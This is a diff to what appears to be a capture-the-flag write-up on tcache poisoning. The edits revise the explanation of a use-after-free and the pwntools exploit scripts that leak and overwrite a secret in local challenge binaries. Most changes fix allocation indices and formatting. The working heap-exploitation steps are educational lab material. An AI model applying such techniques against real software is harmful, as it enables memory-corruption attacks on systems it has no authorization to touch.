@@ -1841,7 +1841,7 @@ Let's say we allocate two chunks `A`, `B` of memory and then free them. It would
 └──────────────────┘
 ```
 
-Then we use the `scanf` command and read the the index of the first allocation `A` using the hanging pointer. The first 8 bytes at that location would hold the `next` pointer which would point to `B`. 
+Then we use the `scanf` command and read to the index of the first allocation `A` using the hanging pointer. The first 8 bytes at that location would hold the `next` pointer which would point to `B`. 
 
 We can overwrite this with the address of the secret.
 This would cause the chunk `B` to be removed from the singly-linked list, and the memory at the secret address would take it's place.
@@ -1958,17 +1958,17 @@ p.sendline(p64(secret_addr))
 print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"malloc")
-p.sendline(b"2")
+p.sendline(b"0")
 p.sendline(b"128")
 print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"malloc")
-p.sendline(b"3")
+p.sendline(b"1")
 p.sendline(b"128")
 print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"puts")
-p.sendline(b"3")
+p.sendline(b"1")
 leak_text = p.recvuntil(b"Data: ").decode()
 secret = p.recvline().strip().decode()
 print(f"{leak_text}{secret}")
@@ -2242,17 +2242,17 @@ p.sendline(p64(secret_addr))
 print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"malloc")
-p.sendline(b"2")
+p.sendline(b"0")
 p.sendline(b"128")
 print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"malloc")
-p.sendline(b"3")
+p.sendline(b"1")
 p.sendline(b"128")
 print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"puts")
-p.sendline(b"3")
+p.sendline(b"1")
 p.recvuntil(b"Data: ")
 secret = p.recvline().strip().decode()
 print(f"[*] Leaked Secret: {secret}")
@@ -2541,6 +2541,9 @@ This would cause the chunk `B` to be removed from the singly-linked list, and th
 
 Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET` would be allocated because to `tcache_perthread_struct`, those are the two free chunks. The first 8 bytes of the `SECRET` chunk would hold the first 8 bytes of secret value, and the next 8 bytes would be right after that.
 
+However, due to Tcache's behaviour of setting the `key` pointer to `NULL` clobbers the trailing 8 bytes of the secret value.
+So, using the previously employesd method, we are able to get the first 8 bytes.
+
 ```
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
 ┊  tcache_perthread_struct Void                                        ┊
@@ -2570,10 +2573,7 @@ Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET
 └──────────────────┘
 ```
 
-Once we malloc the chunk again, we can see that due to Tcache's behaviour of setting the `key` pointer to `NULL` clobbers the trailing 8 bytes of the secret value.
-So, using the previously employesd method, we are able to get the first 8 bytes.
-
-For the next, 8 bytes, we have to pollute Tcache `entry_struct` again, but this time we set the address into which `scanf` reads to 8 bytes after the secret values address. So, let's free the first allocation only so that it is added back into the singly linked list.
+For the next, 8 bytes, we have to pollute Tcache `entry_struct` again, but this time we set the address into which `scanf` reads to 8 bytes after the secret value's address. So, let's free the first allocation only so that it is added back into the singly linked list.
 
 ```
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
@@ -2597,8 +2597,8 @@ For the next, 8 bytes, we have to pollute Tcache `entry_struct` again, but this 
 └──────────────────┘     
 ```
 
-Then we use the `scanf` command and read the the index of the first allocation `A` using the hanging pointer. 
-We can overwrite this with the address of the secret plus 8.
+Then we use the `scanf` command and read to the index of the first allocation `A` using the hanging pointer. 
+We can overwrite this with the address of the `secret` plus 8.
 
 ```
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
@@ -2669,7 +2669,7 @@ This time, even if after allocation the `key` pointer is set to `NULL` we don't 
 
 ### Exploit
 
-```py
+```py title="~/script.py" showLineNumbers
 from pwn import *
 
 p = process("/challenge/seeking-substantial-secrets-easy", level='error')
@@ -2741,12 +2741,12 @@ p.sendline(b"128")
 print(p.recvuntil(b"quit): ").decode())
 
 p.sendline(b"malloc")
-p.sendline(b"2")
+p.sendline(b"1")
 p.sendline(b"128")
 print(p.recvuntil(b"quit): ").decode())
 
 p.sendline(b"puts")
-p.sendline(b"2")
+p.sendline(b"1")
 p.recvuntil(b"Data: ")
 part2 = p.recvline().strip().ljust(8, b"\x00")[:8]
 print(f"Part 2: {part2}")
@@ -3020,7 +3020,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 ### Exploit
 
-```py
+```py title="~/script.py" showLineNumbers
 from pwn import *
 
 p = process("/challenge/seeking-substantial-secrets-hard", level='error')
@@ -3088,12 +3088,12 @@ p.sendline(b"128")
 print(p.recvuntil(b"quit): ").decode())
 
 p.sendline(b"malloc")
-p.sendline(b"2")
+p.sendline(b"1")
 p.sendline(b"128")
 print(p.recvuntil(b"quit): ").decode())
 
 p.sendline(b"puts")
-p.sendline(b"2")
+p.sendline(b"1")
 p.recvuntil(b"Data: ")
 part2 = p.recvline().strip().ljust(8, b"\x00")[:8]
 print(f"Part 2: {part2}")
@@ -3353,19 +3353,19 @@ print(p.recvuntil(b"quit): ").decode())
 
 # Malloc twice to get the chunk at our target address
 p.sendline(b"malloc")
-p.sendline(b"2") 
+p.sendline(b"0") 
 p.sendline(b"128")
 print(p.recvuntil(b"quit): ").decode())
 
 p.sendline(b"malloc")
-p.sendline(b"3") 
+p.sendline(b"1") 
 p.sendline(b"128")
 print(p.recvuntil(b"quit): ").decode())
 
 # Overwrite the secret area
 # Junk padding + our controlled secret
 p.sendline(b"scanf")
-p.sendline(b"3")
+p.sendline(b"1")
 p.sendline(payload)
 print(p.recvuntil(b"quit): ").decode())
 
@@ -3648,19 +3648,19 @@ print(p.recvuntil(b"quit): ").decode())
 
 # Malloc twice to get the chunk at our target address
 p.sendline(b"malloc")
-p.sendline(b"2") 
+p.sendline(b"0") 
 p.sendline(b"128")
 print(p.recvuntil(b"quit): ").decode())
 
 p.sendline(b"malloc")
-p.sendline(b"3") 
+p.sendline(b"1") 
 p.sendline(b"128")
 print(p.recvuntil(b"quit): ").decode())
 
 # Overwrite the secret area
 # Junk padding + our controlled secret
 p.sendline(b"scanf")
-p.sendline(b"3")
+p.sendline(b"1")
 p.sendline(payload)
 print(p.recvuntil(b"quit): ").decode())
 
